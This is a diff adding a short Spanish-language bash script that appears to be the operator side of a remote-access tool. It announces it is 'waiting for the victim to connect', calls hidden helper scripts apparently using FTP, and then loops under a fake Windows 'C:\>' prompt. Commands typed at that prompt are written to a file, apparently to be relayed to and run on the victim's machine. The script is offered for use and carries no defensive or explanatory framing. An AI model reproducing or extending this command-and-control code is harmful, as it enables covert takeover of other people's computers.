@@ -1,0 +1,37 @@
+bash .banner
+echo "Esperando a que la victima entre..."
+aj=$(bash .ftpone)
+de=$(cat l)
+j=$(echo "$de" > .col)
+rm -fr l
+da=$(cat .col)
+
+if [ "$da" = "1" ]; then
+clear
+cat .bann
+echo ""
+echo "Si vas a usar un comando que implique copiar o crear"
+echo "rutas o archivos, porfavor procura que no se repitan"
+echo "ya que causa un error en el sistema..."
+echo ""
+
+CONTADOR=0
+fin=999999999
+while [  $CONTADOR -lt $fin ]; do
+
+cat cm.txt
+
+read -p "C:\>" com
+
+kk=$(bash .ftptwo)
+cat cm.txt
+
+if [ "$com" = "help" ]; then
+cat .ayu
+else
+asff=$(echo "$com" > .co/com.txt)
+fi
+
+done
+fi
+#bash .panel
